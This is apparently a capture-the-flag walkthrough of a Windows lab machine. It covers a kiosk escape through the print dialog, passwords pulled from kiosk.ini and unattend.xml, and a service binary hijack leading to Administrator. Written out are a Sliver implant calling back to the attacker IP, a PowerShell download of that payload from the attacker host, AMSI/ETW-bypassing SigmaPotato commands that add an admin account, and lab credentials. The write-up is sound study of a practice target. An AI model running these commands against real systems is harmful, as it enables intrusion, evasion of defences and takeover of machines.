+++
title = "Kiosk - Walkthrough"
date = "2026-08-26"
author = "nvru"
description = "Walkthrough for the DarkHaven machine."
tags = [
  "ctf",
  "walkthrough",
  "hackSmarter",
  "windows",
  "vdi-escape",
  "unattend-xml",
  "service-misconfiguration",
  "privilege-escalation",
  "Medium"
]
draft = false
+++

## Overview

- **Platform:** HackSmarter
- **Difficulty:** Medium
- **OS:** Windows
- **Attacker IP:** `10.200.84.107`
- **Target IP:** `10.0.23.202`

The objective was to assess DarkHaven's Virtual Desktop Infrastructure (VDI), escape the restricted kiosk environment, obtain additional credentials, and escalate privileges to Administrator.

---

## Enumeration

### Port Scanning

#### RustScan

```bash
rustscan -a 10.0.23.202 -- -sC -sV -A -oN nmap/rust

```

#### Results

```text
PORT     STATE SERVICE       REASON  VERSION
80/tcp   open  http          syn-ack Microsoft IIS httpd 10.0
| http-methods:
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
445/tcp  open  microsoft-ds? syn-ack
3389/tcp open  ms-wbt-server syn-ack Microsoft Terminal Services
| rdp-ntlm-info:
|   Target_Name: EC2AMAZ-0536LUM
|   NetBIOS_Domain_Name: EC2AMAZ-0536LUM
|   NetBIOS_Computer_Name: EC2AMAZ-0536LUM
|   DNS_Domain_Name: EC2AMAZ-0536LUM
|   DNS_Computer_Name: EC2AMAZ-0536LUM
|   Product_Version: 10.0.17763
|_  System_Time: 2026-08-23T02:31:43+00:00
|_ssl-date: 2026-08-23T02:32:03+00:00; -8s from scanner time.
| ssl-cert: Subject: commonName=EC2AMAZ-0536LUM
| Issuer: commonName=EC2AMAZ-0536LUM
5985/tcp open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

```

The port scan revealed the following services:

| Port | Service | Version                     |
| ---- | ------- | --------------------------- |
| 80   | HTTP    | Microsoft IIS httpd 10.0    |
| 445  | SMB     | Microsoft-DS                |
| 3389 | RDP     | Microsoft Terminal Services |
| 5985 | WinRM   | Microsoft HTTPAPI httpd 2.0 |

---

### Remote Desktop (RDP) & VDI Breakout

Using the supplied credentials, I connected to the RDP service. Although the first connection attempt failed, the second succeeded (the machine author noted that the VDI environment may occasionally be unstable).

```bash
xfreerdp /v:10.0.23.202 /u:vdiuser /p:'VDI@DH2024!' /dynamic-resolution
```

Instead of a standard Windows desktop, the session opened a restricted kiosk application.

![Machine Information](/images/hsm/kiosk/weird_app.png)

---

### Print Dialog Breakout

Right-clicking inside the kiosk application exposed a context menu. Selecting Print, followed by Find Printer, launched Windows File Explorer, providing a path to escape the restricted interface.

![Click Right](/images/hsm/kiosk/right_click.png)

![Machine Information](/images/hsm/kiosk/find_printers.png)

![Machine Information](/images/hsm/kiosk/open_explorer.png)

![Machine Information](/images/hsm/kiosk/put_powershell_path.png)

![Machine Information](/images/hsm/kiosk/powershell_vdi.png)

---

### File System Enumeration

After obtaining a PowerShell session as `vdiuser`, I began enumerating the filesystem. Reviewing the contents of `C:\` revealed several interesting directories.

![Root Directories](/images/hsm/kiosk/dirs_root.png)

One of them, `C:\KioskData`, contained a configuration file named `kiosk.ini`. The file stored plaintext configuration settings along with credentials for internal service and database accounts.

![kiosk.ini](/images/hsm/kiosk/kiosk_ini.png)

```ini
[ServiceAccount]
username = svc_monitoring
password = M0n1tor@gent#7!
domain   = darkhaven.tech

[Database]
db_server   = sql.ext.darkhaven.local
db_name     = KioskReports
db_user     = sql_svc
db_password = SqLS3rvic3!
```

Although these credentials were useful for understanding the environment, they were not directly usable for local privilege escalation.

A standard Windows enumeration step is checking `C:\Windows\Panther\`, which often contains unattended installation files left behind after deployment. Inside this directory, `unattend.xml` contained a Base64-encoded password.

![unattend.xml](/images/hsm/kiosk/unattned_xml.png)

The encoded value was:

```text
UwB2AGMAXwBEAEgAIQAyADAAMgA0AA==
```

Decoding it revealed the password:

![Decode base64](/images/hsm/kiosk/base64_decode.png)

```bash
echo "UwB2AGMAXwBEAEgAIQAyADAAMgA0AA==" | base64 -d
```

```text
Svc_DH!2024
```

This password belonged to the local user `svcuser`, providing the next step toward privilege escalation.

---

## Initial Access

### User Switch (`svcuser`)

Using the extracted credentials (`WORKGROUP\svcuser` : `Svc_DH!2024`), a new PowerShell process was spawned under `svcuser`:

```powershell
runas /user:WORKGROUP\svcuser powershell.exe
```

![Machine Information](/images/hsm/kiosk/powershell_svcuser.png)

---

## Post-Exploitation

### Local Enumeration

```powershell
whoami
# workgroup\svcuser
```

Enumerating running services revealed a custom background service:

![Machine Information](/images/hsm/kiosk/search_service.png)

```powershell
Get-Service | Where-Object {$_.DisplayName -like "*kiosk*"}

```

```text
DH_KioskMonitor

```

Inspecting the service configuration revealed the executable path

- `C:\Program Files\Darkheaven Kiosk Services`

![Machine Information](/images/hsm/kiosk/svc_binary.png)

```powershell
sc.exe qc DH_KioskMonitor

```

Checking the permissions on the service directory with `icacls` confirmed that `svcuser` had `Modify` permissions, allowing the service executable to be replaced.

![Service Permission](/images/hsm/kiosk/svc_perm.png)

```powershell
icacls.exe "C:\Program Files\Darkheaven Kiosk Services"

```

---

## Privilege Escalation

### Service Misconfiguration & Binary Hijacking

svcuser did not have permission to modify the service configuration, but the service's executable directory was writable. Because the service could also be restarted by svcuser, replacing the service binary allowed code execution in the service's security context when it was restarted.

![Service stop](/images/hsm/kiosk/svc_stop.png)

```powershell
sc.exe stop DH_KioskMonitor

```

![Service start](/images/hsm/kiosk/svc_start.png)

```powershell
sc.exe start DH_KioskMonitor

```

I stopped and started the service explicitly to confirm that `svcuser` had sufficient permissions to control the service and that the modified service executable would execute successfully after a restart.

I generated a Sliver service payload:

```bash
generate --mtls 10.200.84.107:9812 --os windows --arch amd64 --format service --save DH.exe
```

The payload was hosted locally using Python's HTTP server and downloaded to the writable service directory.

The payload was downloaded to the target, replacing the service binary:

```powershell
powershell -c "iwr http://10.200.84.107:8000/DH.exe -OutFile 'C:\Program Files\Darkheaven Kiosk Services\DH.exe'"
```

---

### Token Impersonation via SigmaPotato

After stopping and starting `DH_KioskMonitor`, the Sliver implant connected back as `dh_admin`, which is a member of the local `Administrators` group.

![Sliver Session](/images/hsm/kiosk/sliver_session.png)

With the resulting privileged Sliver session established, I used Sliver's `execute-assembly` command to execute SigmaPotato directly in memory, bypassing AMSI and Microsoft Defender.

![Make New User](/images/hsm/kiosk/add_user.png)

```text
execute-assembly --amsi-bypass --etw-bypass -i ./exploits/SigmaPotato.exe "net user nvru Password123! /add"
```

The nvru account was successfully created:

![Check User](/images/hsm/kiosk/success_create_user.png)

I then added the newly created nvru account to the local Administrators group:

![Add User To Administrators](/images/hsm/kiosk/add_user_adminstrators.png)

```text
execute-assembly --amsi-bypass --etw-bypass -i ./exploits/SigmaPotato.exe "net localgroup Administrators nvru /add"
```

---

## Administrator Access

Connecting to WinRM as the newly created administrative user `nvru`:

![Evil-Winrm](/images/hsm/kiosk/user_evilwinrm.png)

```bash
evil-winrm-py -i 10.0.23.202 -u nvru -p 'Password123!'
```

Full administrative privileges were verified:

![Flag4](/images/hsm/kiosk/found_flag4.png)

---

## Credentials

```text
vdiuser:VDI@DH2024!
svcuser:Svc_DH!2024
svc_monitoring:M0n1tor@gent#7!
sql_svc:SqLS3rvic3!
nvru:Password123!

```

---

## Flags

### User

```text
DH{vd1_unc_p4th_3sc4p3}

```

```text
DH{unatt3nd_xml_cr3ds}

```

```text
DH{unqu0t3d_s3rv1c3_pwn3d}

```

### Administrator

```text
DH{dll_h1j4ck_4dm1n_0wn3d}

```

---

## Attack Path

```text
Port Scan (Nmap / RustScan)
    ↓
RDP VDI Portal Access (vdiuser)
    ↓
Context Menu Breakout (Print Dialog -> File Explorer)
    ↓
PowerShell Execution as vdiuser (Flag 1)
    ↓
C:\Windows\Panther\unattend.xml Credential Extraction (svcuser) (Flag 2)
    ↓
Service Permission Enumeration (DH_KioskMonitor) (Flag 3)
    ↓
Binary Replacement & Service Restart via Sliver C2
    ↓
In-Memory SigmaPotato Privilege Escalation
    ↓
Evil-WinRM Shell as Administrator / Root (Flag 4)

```

---

## References

- [Tylerdotrar – SigmaPotato](https://github.com/tylerdotrar/SigmaPotato)
- [Sliver – Documentation](https://sliver.sh/docs)
